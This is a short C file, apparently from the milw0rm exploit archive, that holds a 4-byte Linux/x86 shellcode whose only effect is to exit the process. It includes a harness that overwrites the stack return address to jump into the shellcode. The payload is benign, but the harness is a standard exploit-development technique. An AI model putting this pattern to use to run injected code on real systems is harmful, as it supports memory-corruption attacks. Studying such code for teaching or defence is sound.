/*
 * (linux/x86) quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\xf7\xf0"              // div %eax
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]